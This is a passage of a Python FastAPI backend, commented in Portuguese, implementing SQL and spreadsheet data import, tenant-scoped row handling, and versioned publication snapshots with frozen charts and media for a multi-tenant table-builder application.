                        "to_column": fk["to_column"],
                        "colunas_locais": colunas_locais,
                    })

            except Exception as e:
                db.rollback()
                errors.append(f"CREATE error for {table_name}: {str(e)}")

        elif item["type"] == "INSERT":
            table_name = item["table_name"]
            physical_name = item["physical_name"]
            prefixed_stmt = item["statement"]
            try:
                with engine.begin() as conn:
                    conn.execute(text(prefixed_stmt))
                inserted_rows += 1
            except Exception as e:
                errors.append(f"INSERT error for {table_name}: {str(e)}")

    # ── 2º passe: FK do arquivo vira relação LÓGICA no catálogo ──────────────
    #
    # Nada de DDL aqui: a constraint física já foi removida do CREATE. Isto
    # grava a MESMA linha que o `POST /api/relations` grava quando o admin
    # declara a relação clicando — o Esquema desenha a aresta tracejada, e o
    # dado no banco continua sem constraint (idêntico ao que o import sempre fez).
    #
    # O alvo é resolvido SÓ no catálogo deste admin (`owner_id`), nunca por
    # introspecção física do banco: perguntar ao Postgres "esta tabela existe?"
    # transformaria o relatório do import num enumerador de nomes alheios —
    # medido, um arquivo de FKs chutadas confirmava `users` e `_audit_log`.
    if fks_pendentes:
        try:
            catalogo = {
                t.name: t.id
                for t in db.query(models.DynamicTable)
                         .filter(models.DynamicTable.owner_id == current_admin.id).all()
            }
            colunas_por_tabela: dict[int, set] = {}

            def _colunas(tid: int) -> set:
                if tid not in colunas_por_tabela:
                    colunas_por_tabela[tid] = {
                        c.name for c in db.query(models.DynamicColumn)
                                        .filter(models.DynamicColumn.table_id == tid).all()
                    }
                return colunas_por_tabela[tid]

            vistas = set()
            for fk in fks_pendentes:
                alvo_id = catalogo.get(fk["to_table"])
                if alvo_id is None:
                    # Eco do nome que o ARQUIVO escreveu — não confirma nem nega
                    # a existência de nada fora do catálogo de quem importou.
                    warnings.append(
                        f"FK ignorada: '{fk['from_table_name']}' referencia "
                        f"'{fk['to_table']}', que não é uma tabela deste workspace.")
                    continue
                if fk["from_column"] and fk["from_column"] not in fk["colunas_locais"]:
                    warnings.append(
                        f"FK ignorada: coluna '{fk['from_column']}' não existe em "
                        f"'{fk['from_table_name']}'.")
                    continue
                if fk["to_column"] and fk["to_column"] not in _colunas(alvo_id):
                    warnings.append(
                        f"FK ignorada: coluna '{fk['to_column']}' não existe em "
                        f"'{fk['to_table']}'.")
                    continue

                chave = (fk["from_table_id"], fk["from_column"], alvo_id, fk["to_column"])
                if chave in vistas:
                    continue   # FK repetida dentro do mesmo arquivo
                vistas.add(chave)

                # `_relations` não tem unique constraint (models.py) — reimportar
                # o mesmo arquivo duplicaria a aresta sem esta checagem.
                ja_existe = db.query(models.DynamicRelation).filter(
                    models.DynamicRelation.from_table_id == fk["from_table_id"],
                    models.DynamicRelation.to_table_id == alvo_id,
                    models.DynamicRelation.from_column_name == fk["from_column"],
                    models.DynamicRelation.to_column_name == fk["to_column"],
                ).first()
                if ja_existe:
                    continue

                db.add(models.DynamicRelation(
                    name=f"rel_{fk['from_table_name']}_{fk['from_column']}__"
                         f"{fk['to_table']}_{fk['to_column']}"[:100],
                    from_table_id=fk["from_table_id"],
                    to_table_id=alvo_id,
                    relation_type="many-to-one",
                    from_column_name=fk["from_column"],
                    to_column_name=fk["to_column"],
                ))
                relations_created += 1
            db.commit()
        except Exception as exc:
            db.rollback()
            relations_created = 0
            # As tabelas e as linhas já estão duráveis: relação que falha vira
            # aviso, não erro do import. O admin declara na mão no editor.
            warnings.append(f"Relações do arquivo não puderam ser registradas: {exc}")

    # M9 F1: evento COARSE — a cardinalidade aqui é de STATEMENTS, não de linhas
    # (`inserted_rows` conta INSERTs executados), e o caminho é não-atômico:
    # cada statement rodou em `engine.begin()` numa conexão própria e já está
    # durável. Um audit que levantasse aqui reportaria falha de um import que
    # de fato aconteceu.
    audit.record_best_effort(
        db, owner_id=current_admin.id, actor=audit.user_actor(current_admin),
        action=audit.IMPORT_SQL, target_type=audit.T_WORKSPACE,
        target_id=current_admin.id, target_label=current_admin.workspace_name,
        details={"file": file.filename, "created_tables": created_tables,
                 "insert_statements": inserted_rows, "error_count": len(errors),
                 "relations_created": relations_created},
    )
    return {"created_tables": created_tables, "inserted_rows": inserted_rows,
            "errors": errors, "relations_created": relations_created,
            "warnings": warnings}

# ==========================================
# CSV / XLSX Data Import (Moderator + Admin)
# ==========================================
import pandas as pd
import json
import import_infer  # M8 F4: inferência + sanitização (módulo puro)

@app.post("/api/import/data/{table_name}")
async def import_data_file(
    table_name: str,
    file: UploadFile = File(...),
    db: Session = Depends(tenant_db),
    current_user: models.User = Depends(get_current_active_user),
):
    if current_user.role == "master":
        raise HTTPException(status_code=403, detail="Use an admin or moderator account for data imports")

    accessible = get_accessible_tables(current_user, db)
    db_table = next((t for t in accessible if t.name == table_name), None)
    if not db_table:
        raise HTTPException(status_code=404, detail="Table not found or no access")

    try:
        table = _load_physical_table(db_table)
    except Exception:
        raise HTTPException(status_code=404, detail=f"Table {table_name} not found")
    
    content = await file.read()
    filename = file.filename.lower()
    
    try:
        if filename.endswith(".csv"):
            df = pd.read_csv(io.BytesIO(content))
        elif filename.endswith(".xlsx") or filename.endswith(".xls"):
            df = pd.read_excel(io.BytesIO(content))
        else:
            raise HTTPException(status_code=400, detail="Only .csv and .xlsx/.xls files are supported")
    except HTTPException:
        raise
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Error reading file: {str(e)}")
    
    valid_columns = [col.name for col in table.columns]
    matching_columns = [col for col in df.columns if col in valid_columns]
    if not matching_columns:
        raise HTTPException(status_code=400, detail=f"No matching columns found. Expected: {valid_columns}")
    
    # commit cuidado pela dependency tenant_db
    inserted, total, errors = _insert_dataframe(df[matching_columns], table, db_table, db)
    # M9 F1: UM evento agregado, nunca um por linha (decisão 5). 10k linhas =
    # 10k eventos afogariam a trilha e, na F3, viraria tempestade de webhook.
    # É atômico: este handler roda sob `tenant_db`.
    audit.record(
        db, owner_id=db_table.owner_id, actor=audit.user_actor(current_user),
        action=audit.IMPORT_APPEND, target_type=audit.T_TABLE, target_id=db_table.id,
        target_label=db_table.name, changed_columns=matching_columns,
        details={"file": file.filename, "inserted_rows": inserted,
                 "total_rows": total, "error_count": len(errors)},
    )
    # M9 F3: UM evento agregado (decisão F3-2), sem as linhas. 10k linhas =
    # 10k webhooks derrubaria o receptor e a outbox junto; e o consumidor que
    # quiser o detalhe relê a tabela, que é o que ele faria de todo jeito.
    emit_webhook(
        db, owner_id=db_table.owner_id, event=webhooks.EV_IMPORTED,
        table_name=db_table.name, pk=None, row=None,
        actor=audit.user_actor(current_user),
        extra={"inserted_rows": inserted, "total_rows": total,
               "columns": matching_columns, "file": file.filename},
    )
    return {"inserted_rows": inserted, "total_rows": total, "matched_columns": matching_columns, "errors": errors[:10]}


def _insert_dataframe(df, table, db_table, db):
    """Carrega um DataFrame numa tabela física — savepoints por-linha (linha ruim
    não derruba o lote), força tenant_id em PG. Extraído do import de append e
    reusado pelo commit da F4. Retorna (inserted, total, errors)."""
    df = df.where(pd.notnull(df), None)
    records = df.to_dict(orient="records")
    inserted, errors = 0, []
    for record in records:
        try:
            clean = {k: v for k, v in record.items() if v is not None}
            if clean:
                # Defesa contra forge: força tenant_id na linha de import (PG).
                if is_postgres() and "tenant_id" in table.columns:
                    clean["tenant_id"] = db_table.tenant_id
                with db.begin_nested():
                    db.execute(insert(table).values(**clean))
                inserted += 1
        except Exception as e:
            errors.append(str(e))
    return inserted, len(records), errors


# ── M8 F4: import que CRIA tabela (dry-run + commit) ──────────────────────
# 3 segmentos → imune ao bloco dinâmico /api/{table_name}; co-locado com o
# import de append por coesão. Server dry-run = fonte única (parse+infer+sanitize).

def _table_name_status(name: str, db: Session, current_user: models.User) -> str:
    if name.strip().lower() in RESERVED_TABLE_NAMES:
        return "reserved"
    if any(t.name == name for t in get_accessible_tables(current_user, db)):
        return "conflict"
    return "ok"


def _dry_run_create(df, table_name, filename, sample_rows, db, current_user):
    proposals = import_infer.sanitize_headers(list(df.columns))
    columns = []
    for i, prop in enumerate(proposals):
        series = df.iloc[:, i]  # por posição (headers duplicados são ambíguos por nome)
        columns.append({
            "original_header": prop["original_header"],
            "name": prop["name"],
            "data_type": import_infer.infer_column(series),
            "is_nullable": True,
            "note": prop["badge"],
            "sample_values": [str(v) for v in series.dropna().head(3).tolist()],
        })
    base = table_name or (filename or "tabela").rsplit(".", 1)[0]
    proposed = import_infer.sanitize_column_name(base, 1)[0]
    return {
        "mode": "create",
        "table_name": proposed,
        "name_status": _table_name_status(proposed, db, current_user),
        "summary": {"rows": int(len(df)), "columns": int(len(df.columns))},
        "columns": columns,
        "system_columns": ["id"] + (["tenant_id"] if is_postgres() else []),
        "sample_rows": sample_rows,
        "warnings": [],
    }


def _dry_run_append(df, table_name, sample_rows, db, current_user):
    if not table_name:
        raise HTTPException(status_code=400, detail="table_name obrigatório no modo append")
    db_table = next((t for t in get_accessible_tables(current_user, db) if t.name == table_name), None)
    if not db_table:
        raise HTTPException(status_code=404, detail="Table not found or no access")
    table = _load_physical_table(db_table)
    valid = {c.name for c in table.columns}
    meta = {
        c.name: c.data_type
        for c in db.query(models.DynamicColumn).filter(models.DynamicColumn.table_id == db_table.id).all()
    }
    columns = [
        {
            "original_header": str(orig),
            "match": "matched" if orig in valid else "unmatched",
            "target_type": meta.get(orig),
            "sample_values": [str(v) for v in df.iloc[:, i].dropna().head(3).tolist()],
        }
        for i, orig in enumerate(df.columns)
    ]
    return {
        "mode": "append",
        "table_name": table_name,
        "summary": {"rows": int(len(df)), "columns": int(len(df.columns))},
        "columns": columns,
        "target_columns": sorted(valid),
        "sample_rows": sample_rows,
        "warnings": [],
    }


@app.post("/api/import/table/dry-run")
async def import_table_dry_run(
    file: UploadFile = File(...),
    mode: str = Form("create"),
    table_name: str = Form(None),
    db: Session = Depends(tenant_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """M8 F4: dry-run do import que CRIA tabela (mode=create) ou do append real
    (mode=append). Parseia+infere+sanitiza no servidor; NÃO persiste. Master 403."""
    if current_user.role == "master":
        raise HTTPException(status_code=403, detail="Use an admin or moderator account for imports")
    content = await file.read()
    if len(content) > import_infer.MAX_BYTES:
        raise HTTPException(status_code=413, detail=f"Arquivo excede {import_infer.MAX_BYTES // (1024 * 1024)}MB")
    try:
        df = import_infer.parse_spreadsheet(content, file.filename or "")
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))
    sample_rows = json.loads(df.head(5).to_json(orient="records"))
    if mode == "append":
        return _dry_run_append(df, table_name, sample_rows, db, current_user)
    return _dry_run_create(df, table_name, file.filename, sample_rows, db, current_user)


@app.post("/api/import/table/commit")
async def import_table_commit(
    file: UploadFile = File(...),
    table_name: str = Form(...),
    columns: str = Form(...),
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """M8 F4: cria a tabela do schema confirmado (reusa create_table da F0) e
    carrega as linhas. get_db (commit manual): create_table dá 4 commits que
    apagam o GUC transaction-local → re-setamos antes do insert. Master 403."""
    if current_user.role == "master":
        raise HTTPException(status_code=403, detail="Use an admin or moderator account for imports")
    content = await file.read()
    if len(content) > import_infer.MAX_BYTES:
        raise HTTPException(status_code=413, detail=f"Arquivo excede {import_infer.MAX_BYTES // (1024 * 1024)}MB")
    try:
        df = import_infer.parse_spreadsheet(content, file.filename or "")
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))
    try:
        col_spec = json.loads(columns)
        assert isinstance(col_spec, list)
    except Exception:
        raise HTTPException(status_code=400, detail="Campo 'columns' inválido (JSON de lista esperado)")

    file_cols = list(df.columns)
    # só as colunas reenviadas (com original_header presente no arquivo) são mantidas
    kept = [c for c in col_spec if isinstance(c, dict) and c.get("original_header") in file_cols]
    if not kept:
        raise HTTPException(status_code=400, detail="Nenhuma coluna válida pra importar")

    # re-sanitiza os nomes editados server-side (idempotente + re-dedupe)
    resan = import_infer.sanitize_headers([str(c.get("name", "")) for c in kept])
    proposed_table = import_infer.sanitize_column_name(table_name, 1)[0]

    # M9 F4: o `TableCreate` abaixo é construído EM CÓDIGO, não vem de request —
    # então o validador do schema levantaria `ValidationError` crua e o cliente
    # levaria 500 em vez do 400 explicativo. Validar aqui devolve a mensagem
    # certa. (A sanitização acima já deve produzir nome válido; isto é a rede.)
    try:
        schemas.validate_table_name(proposed_table, RESERVED_TABLE_NAMES)
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    col_creates, rename_map, coerce_cols = [], {}, []
    for spec, rp in zip(kept, resan):
        final = rp["name"]
        rename_map[spec["original_header"]] = final
        dtype = spec.get("data_type", "String")
        col_creates.append(schemas.ColumnCreate(
            name=final, data_type=dtype,
            is_nullable=bool(spec.get("is_nullable", True)),
            is_unique=False, is_primary=False,
        ))
        coerce_cols.append((spec["original_header"], final, dtype))

    table_create = schemas.TableCreate(
        name=proposed_table,
        description=f"Importado de {file.filename}",
        source=file.filename,   # M8.5 F3: origem citável = o arquivo importado
        columns=col_creates,
        is_public=False,
    )
    # cria a tabela (reusa o seam F0 — reserved-check, rollback físico, auto id/
    # tenant_id). HTTPException (reserved/DDL) propaga: nada persiste, load nem roda.
    db_table = create_table(table_create, db, current_user)

    # M9 F1: identidade em locais — o caminho de falha abaixo deleta a linha de
    # `_tables`, e ler o atributo do objeto expirado depois disso não funciona.
    _owner_id = db_table.owner_id
    _table_pk = db_table.id
    _table_name = db_table.name

    # os commits do create_table apagaram o GUC transaction-local → re-seta.
    set_tenant_for_session(db, db_table.tenant_id)
    try:
        table = _load_physical_table(db_table)
        load_df = df[[s["original_header"] for s in kept]].rename(columns=rename_map)
        # coage os valores string do CSV pro tipo Python do target (Boolean/Integer/
        # Float/DateTime) — o SQLAlchemy Boolean rejeita 'sim' cru; DateTime → ISO.
        for orig, final, dtype in coerce_cols:
            load_df[final] = import_infer.coerce_for_load(df[orig], dtype)
        inserted, total, errors = _insert_dataframe(load_df, table, db_table, db)
        db.commit()
    except Exception as e:
        db.rollback()
        # falha DURA no load → dropa a tabela recém-criada (nunca deixa órfã vazia)
        try:
            drop_physical_table(
                db_table.tenant_id, db_table.name,
                schema_name=db_table.schema_name, physical_name=db_table.physical_name,
            )
            db.delete(db_table)
            db.commit()
        except Exception:
            db.rollback()
        # M9 F1: o `create_table` acima JÁ gravou um `table.create` que commitou.
        # Sem este evento, a trilha mostraria uma tabela criada que não existe
        # mais — mentira por omissão. O par create→delete conta o que houve.
        audit.record_best_effort(
            db, owner_id=_owner_id, actor=audit.user_actor(current_user),
            action=audit.TABLE_DELETE, target_type=audit.T_TABLE,
            target_id=_table_pk, target_label=_table_name,
            details={"reason": "import_load_failed"},
        )
        raise HTTPException(status_code=400, detail=f"Falha ao carregar linhas: {e}")

    audit.record_best_effort(
        db, owner_id=_owner_id, actor=audit.user_actor(current_user),
        action=audit.IMPORT_CREATE_TABLE, target_type=audit.T_TABLE,
        target_id=_table_pk, target_label=_table_name,
        changed_columns=[c.name for c in col_creates],
        details={"file": file.filename, "inserted_rows": inserted,
                 "total_rows": total, "error_count": len(errors)},
    )
    return {
        "created": True,
        "table": db_table.name,
        "columns": [c.name for c in col_creates],
        "inserted_rows": inserted,
        "total_rows": total,
        "errors": errors[:10],
    }


# ==========================================
# Publications (M6 Fase 1)
# ==========================================
import publication_storage  # noqa: E402


def _build_snapshot_payload(
    owner: models.User,
    version_number: int,
    description: str | None,
    theme_config: dict,
    table_selection: list[schemas.TableSelectionItem],
    db: Session,
    charts: list[schemas.ChartSpec] | None = None,
) -> dict:
    """Coleta os dados das tabelas curadas e monta o blob do snapshot.

    Trunca em `MAX_ROWS_PER_TABLE` por tabela (10.000 desde o 1.3) e respeita
    `MAX_SNAPSHOT_BYTES` no blob inteiro — passado o orçamento, a tabela entra
    com zero linha e `budget_exceeded=True`, nunca truncada em silêncio.

    **B10 — por que o `set_tenant_for_session` está aqui:** este é o ÚNICO
    caminho do backend que lia tabela física de tenant sem declarar o tenant.
    Ele roda sob `get_db` (as duas rotas que o chamam — criar versão e preview
    — precisam de commit manual), e `get_db` não seta o GUC.

    Isso funcionava por acidente de privilégio: a role da aplicação tem
    `rolbypassrls=TRUE` hoje, então a policy nunca é avaliada. No dia em que
    esse privilégio cair (pooler novo, hardening, role dedicada), o mesmo
    endpoint passa a errar de **duas** formas conforme o estado da conexão:

      - conexão reciclada (GUC em `''`) → 22P02 → **500**;
      - conexão virgem (GUC NULL) → **200 com `rows: []`**, sobe o blob e
        publica um **site vazio**, sem erro nenhum.

    O segundo é o perigoso, e é a razão de o fix estar aqui e não só na policy:
    corrigir a policy faria o 500 virar silêncio. Declarar o tenant mata os dois.
    """
    from datetime import datetime as _dt
    import json as _json

    # Lista de 1 elemento pra o acumulador ser legível dentro do loop sem
    # `nonlocal` (a montagem é um for simples, não uma closure).
    bytes_acumulados = [0]

    set_tenant_for_session(db, owner.id)

    tables_payload: list[dict] = []
    for item in table_selection:
        db_table = (
            db.query(models.DynamicTable)
            .filter(models.DynamicTable.id == item.table_id, models.DynamicTable.owner_id == owner.id)
            .first()
        )
        if not db_table:
            # Curadoria refere tabela inexistente / de outro tenant — pula
            # com aviso. Frontend deve revalidar selection antes de publicar.
            continue

        try:
            phys = _load_physical_table(db_table)
        except Exception:
            tables_payload.append({
                "name": db_table.name,
                "layout": item.layout,
                "columns": [],
                "rows": [],
                "truncated": False,
                "total_rows": 0,
                "error": "physical_table_not_found",
            })
            continue

        # Orçamento do snapshot inteiro (1.3): passado o teto global, a tabela
        # entra no site com metadado e ZERO linha, e o `budget_exceeded` diz
        # isso na cara. Nunca truncar calado — o site publicado não mente
        # tamanho (mesma régua da proveniência do M8.5 F3).
        estourou_orcamento = bytes_acumulados[0] >= publication_storage.MAX_SNAPSHOT_BYTES
        limit = 0 if estourou_orcamento else publication_storage.MAX_ROWS_PER_TABLE
        # F0: sem ordem, QUAIS linhas entram no site publicado muda a cada
        # publicação de uma tabela acima do teto — o corte pega o que a heap
        # devolver. Duas publicações do mesmo dado davam sites diferentes.
        rows_result = db.execute(
            ordem_estavel(select(phys), phys).limit(limit + 1)
        ).fetchall()
        truncated = len(rows_result) > limit
        rows = [dict(r._mapping) for r in rows_result[:limit]]

        # Quando trunca, `total_rows` precisa ser a contagem REAL — o
        # snapshot (e o export que o congela) não pode mentir o tamanho.
        total_rows = (
            db.execute(select(func.count()).select_from(phys)).scalar_one()
            if truncated
            else len(rows)
        )

        # `tenant_id` é detalhe interno do RLS — não exponho no snapshot público.
        for r in rows:
            r.pop("tenant_id", None)

        cols_meta = (
            db.query(models.DynamicColumn)
            .filter(models.DynamicColumn.table_id == db_table.id)
            .all()
        )

        bytes_acumulados[0] += len(
            _json.dumps(rows, default=publication_storage._json_default).encode("utf-8")
        )

        tables_payload.append({
            "name": db_table.name,
            "layout": item.layout,
            # M8.5 F3: proveniência citável no impresso acadêmico. NULL = sem
            # origem informada (o acadêmico não fabrica fonte).
            "source": db_table.source,
            "columns": [{"name": c.name, "data_type": c.data_type} for c in cols_meta],
            "rows": rows,
            "truncated": truncated,
            "total_rows": total_rows,
            "budget_exceeded": estourou_orcamento,
        })

    return {
        "schema_version": 1,
        "owner": {
            "workspace_slug": owner.workspace_slug,
            "workspace_name": owner.workspace_name,
        },
        "version_number": version_number,
        "created_at": _dt.utcnow().isoformat(),
        "description": description,
        "theme": theme_config,
        "tables": tables_payload,
        # M8.5 F2: gráficos congelados. `charts[]` é ADITIVO — `schema_version`
        # NÃO bumpa (mesmo precedente do M8 F3, que congelou mídia sem bump:
        # os consumidores leem o blob cru e ignoram chave que não conhecem).
        "charts": _build_chart_artifacts(owner, table_selection, charts, theme_config, db),
    }


def _chart_source_allowed(
    db_table: models.DynamicTable,
    owner: models.User,
    selected_ids: set[int],
) -> bool:
    """Decisão 8 do Diretor (2026-07-17), mantida CROSS-OWNER em 2026-07-17.

    Um gráfico pode consumir qualquer tabela cujo dado JÁ esteja publicado:
    `table_id` na `table_selection` **OU** `is_public=True` — união, e o
    `is_public` vale para tabela de QUALQUER owner (o Diretor foi consultado e
    segurou esse escopo em vez de estreitar pra owner-only).

    Racional: agregado de dado que já é público não revela nada novo. O que a
    trava impede é gráfico sobre tabela que o público não alcança por via
    nenhuma.

    Mora AQUI, no chamador do publish — nunca no core de agregação. O mesmo core
    serve o endpoint do admin (que PODE ver tabela privada própria) e o publish;
    se a trava fosse no core, ou barraria o admin ou vazaria no publish.
    """
    if db_table.is_public:
        return True
    return db_table.id in selected_ids and db_table.owner_id == owner.id


def _build_chart_artifacts(
    owner: models.User,
    table_selection: list[schemas.TableSelectionItem],
    charts: list[schemas.ChartSpec] | None,
    theme_config: dict,
    db: Session,
) -> list[dict]:
    """Congela cada gráfico curado como SVG estático + tabela-alternativa.

    Roda na MESMA sessão `get_db` do `_build_snapshot_payload`, sobre o dado
    COMPLETO (decisão 2 do Diretor) — não sobre as 2000 linhas truncadas do
    snapshot. Por isso o total do gráfico pode passar das linhas visíveis: é
    número mais verdadeiro, e a legenda do SVG diz isso explicitamente pra não
    parecer inconsistência.

    Nunca derruba o publish (mesmo padrão das tabelas, :2053-2063): gráfico que
    estoura o `statement_timeout` ou perde a fonte cai com `error` e aviso — um
    gráfico quebrado não pode brickar a publicação inteira do workspace.
    """
    if not charts:
        return []

    selected_ids = {i.table_id for i in (table_selection or [])}
    out: list[dict] = []

    for spec in sorted(charts, key=lambda c: c.order):
        entry: dict = {
            "view_id": spec.view_id,
            "title": spec.title,
            "chart_type": spec.chart_type,
            "order": spec.order,
        }
        db_view = (
            db.query(models.DynamicView)
            .filter(models.DynamicView.id == spec.view_id,
                    models.DynamicView.owner_id == owner.id)
            .first()
        )
        if not db_view:
            out.append({**entry, "error": "view_not_found"})
            continue

        db_table = (
            db.query(models.DynamicTable)
            .filter(models.DynamicTable.id == db_view.table_id)
            .first()
        )
        if not db_table:
            out.append({**entry, "error": "source_table_not_found"})
            continue
        if not _chart_source_allowed(db_table, owner, selected_ids):
            # Fonte privada e não-publicada: recusa alta (não é curadoria
            # stale, é gráfico apontando pra dado que o público não alcança).
            out.append({**entry, "error": "source_not_published"})
            continue

        try:
            table = _load_physical_table(db_table)
            spec_agg = _spec_from(db_view.group_by, db_view.operation,
                                  db_view.metric_column, db_view.config or {})
            agg = aggregation.run_aggregation(
                db, table, spec_agg,
                media_columns=media_cleanup.media_column_names(db_table),
            )
            rendered = chart_svg.render_chart(agg, theme_config or {}, spec.title,
                                              chart_type=spec.chart_type)
        except Exception as exc:  # noqa: BLE001 — nunca derruba o publish
            logger.warning("chart %s falhou no publish: %s", spec.view_id, exc)
            out.append({**entry, "error": "render_failed", "detail": str(exc)[:200]})
            continue

        out.append({
            **entry,
            "source_table": db_table.name,
            "svg": rendered["svg"],
            "alt_table": rendered["alt_table"],
            "warnings": rendered["warnings"],
            # provas de honestidade COPIADAS do motor (não recomputadas):
            # per-série no `series`, top-level aqui.
            "operation": agg["operation"],
            "group_by": agg["group_by"],
            "metric_column": agg.get("metric_column"),
            "null_label": agg.get("null_label"),
            "rest_label": agg.get("rest_label"),
            "series_meta": [
                {
                    "label": s["label"],
                    "source_row_count": s["source_row_count"],
                    "cardinality": s["cardinality"],
                    "truncated": s["truncated"],
                    "rest": s.get("rest"),
                }
                for s in agg["series"]
            ],
        })

    return out


def _freeze_snapshot_media(payload: dict, owner_id: int, version_number: int) -> list[str]:
    """M8 F3 (#3=A): congela a mídia do snapshot num retrato imutável por-versão.

    Copia cada asset GERENCIADO referenciado pelas células de mídia pra um path
    imutável (`{owner}/pub/v{N}__…`) e reescreve a célula pro novo path ANTES de
    o blob subir — o snapshot nunca 404a mesmo se a célula viva for trocada ou
    limpada depois. `schema_version` NÃO bumpa (a célula continua string).

    Dedup por src (biblioteca central: 1 asset reusado em N células = 1 cópia).
    URL externa/legada/vazia (`url_to_path` = None) fica intocada. Best-effort:
    a cópia nunca derruba o publish (a URL viva ainda resolve como fallback)."""
    copied: list[str] = []
    copy_map: dict[str, str] = {}  # src_path -> URL pública da cópia
    for table in payload.get("tables", []):
        media_cols = {
            c["name"]
            for c in table.get("columns", [])
            if c.get("data_type") in schemas.MEDIA_TYPES
        }
        if not media_cols:
            continue
        for row in table.get("rows", []):
            for col in media_cols:
                src_path = media_storage.url_to_path(row.get(col))
                if not src_path:
                    continue
                if src_path not in copy_map:
                    dst_path = media_storage.snapshot_copy_path(owner_id, version_number, src_path)
                    media_storage.copy(src_path, dst_path)
                    copy_map[src_path] = media_storage.public_url(dst_path)
                    copied.append(dst_path)
                row[col] = copy_map[src_path]
    return copied


def _dt_now_utc():
    from datetime import datetime as _dt
    return _dt.utcnow()


def _serialize_pub_version(v: models.PublicationVersion) -> dict:
    return {
        "id": v.id,
        "owner_id": v.owner_id,
        "version_number": v.version_number,
        "created_at": v.created_at,
        "created_by": v.created_by,
        "is_active": v.is_active,
        "activated_at": v.activated_at,
        "description": v.description,
        "theme_config": v.theme_config or {},
        "table_selection": v.table_selection or [],
        "chart_selection": v.chart_selection or [],
    }


@app.get("/api/publications/me/versions", response_model=List[schemas.PublicationVersionResponse])
def list_my_publication_versions(
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """Lista versões do workspace do user (admin ou mod herda parent)."""
    if current_user.role == "master":
        raise HTTPException(status_code=403, detail="Master não tem workspace próprio")
    owner_id = current_user.id if current_user.role == "admin" else current_user.parent_id
    versions = (
        db.query(models.PublicationVersion)
        .filter(models.PublicationVersion.owner_id == owner_id)
        .order_by(models.PublicationVersion.version_number.desc())
        .all()
    )
    return [_serialize_pub_version(v) for v in versions]


@app.get("/api/publications/me/active", response_model=schemas.PublicationVersionResponse)
def get_my_active_publication(
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_active_user),
):
    if current_user.role == "master":
        raise HTTPException(status_code=403, detail="Master não tem workspace próprio")
    owner_id = current_user.id if current_user.role == "admin" else current_user.parent_id
    active = (
        db.query(models.PublicationVersion)
        .filter(models.PublicationVersion.owner_id == owner_id, models.PublicationVersion.is_active == True)
        .first()
    )
    if not active:
        raise HTTPException(status_code=404, detail="Nenhuma versão ativa")
    return _serialize_pub_version(active)


@app.post("/api/publications/me/versions", response_model=schemas.PublicationVersionResponse)
def create_publication_version(
    body: schemas.PublicationVersionCreate,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """Cria nova versão. NÃO ativa automaticamente — admin precisa
    chamar /activate explicitamente (princípio: snapshot != publish)."""
    if current_user.role == "master":
        raise HTTPException(status_code=403, detail="Master não tem workspace próprio")
    owner_id = current_user.id if current_user.role == "admin" else current_user.parent_id
    owner = db.query(models.User).filter(models.User.id == owner_id).first()
    if not owner:
        raise HTTPException(status_code=404, detail="Owner não encontrado")

    last = (
        db.query(models.PublicationVersion)
        .filter(models.PublicationVersion.owner_id == owner_id)
        .order_by(models.PublicationVersion.version_number.desc())
        .first()
    )
    next_number = (last.version_number + 1) if last else 1

    storage_path = publication_storage.snapshot_path(owner_id, next_number)
    payload = _build_snapshot_payload(
        owner=owner,
        version_number=next_number,
        description=body.description,
        theme_config=body.theme_config,
        table_selection=body.table_selection,
        db=db,
        charts=body.charts,
    )
    # #3=A: congela a mídia num retrato imutável por-versão ANTES de subir o
    # blob (reescreve as células pro path copiado). Ver _freeze_snapshot_media.
    _freeze_snapshot_media(payload, owner_id, next_number)
    publication_storage.upload(storage_path, payload)

    new_version = models.PublicationVersion(
        owner_id=owner_id,
        version_number=next_number,
        created_by=current_user.id,
        is_active=False,
        description=body.description,
        storage_path=storage_path,
        theme_config=body.theme_config,
        table_selection=[item.model_dump() for item in body.table_selection],
        chart_selection=[c.model_dump() for c in body.charts],
    )
    db.add(new_version)
    try:
        db.flush()
        audit.record(
            db, owner_id=owner_id, actor=audit.user_actor(current_user),
            action=audit.PUBLICATION_CREATE, target_type=audit.T_VERSION,
            target_id=new_version.id, target_label=f"v{next_number}",
            details={"tables": len(body.table_selection), "charts": len(body.charts)},
        )
        db.commit()
        db.refresh(new_version)
    except Exception:
        db.rollback()
        publication_storage.delete(storage_path)
        # limpa as cópias de mídia congeladas acima (seam de rollback #3=A)
        media_storage.remove_pub_media(owner_id, next_number)
        raise

    return _serialize_pub_version(new_version)


@app.post("/api/publications/me/preview")
def preview_publication_draft(
    body: schemas.PublicationPreview,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """Preview do rascunho SEM persistir (PR4b/M8 F3): monta o MESMO blob do
    publish com `_build_snapshot_payload` e devolve — preview == publish, zero
    drift. Não sobe storage, não cria versão, não congela mídia (efêmero: mostra
    a mídia VIVA). Guard igual aos demais me/*: admin+mod, master 403."""
    if current_user.role == "master":
        raise HTTPException(status_code=403, detail="Master não tem workspace próprio")
    owner_id = current_user.id if current_user.role == "admin" else current_user.parent_id
    owner = db.query(models.User).filter(models.User.id == owner_id).first()
    if not owner:
        raise HTTPException(status_code=404, detail="Owner não encontrado")
    return _build_snapshot_payload(
        owner=owner,
        version_number=0,
        description=None,
        theme_config={},
        table_selection=body.table_selection,
        db=db,
        # F2: o preview congela os MESMOS gráficos que o publish congelaria —
        # senão o Studio mostra uma coisa e o site publicado mostra outra
        # (o drift preview≠publish que o cético do detalhamento apontou).
        charts=body.charts,
    )


@app.post("/api/publications/me/versions/{version_id}/activate", response_model=schemas.PublicationVersionResponse)
def activate_publication_version(
    version_id: int,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_active_user),
):
    if current_user.role == "master":
        raise HTTPException(status_code=403, detail="Master não tem workspace próprio")
    owner_id = current_user.id if current_user.role == "admin" else current_user.parent_id

    target = (
        db.query(models.PublicationVersion)
        .filter(
            models.PublicationVersion.id == version_id,
            models.PublicationVersion.owner_id == owner_id,
        )
        .first()
    )
    if not target:
        raise HTTPException(status_code=404, detail="Versão não encontrada")

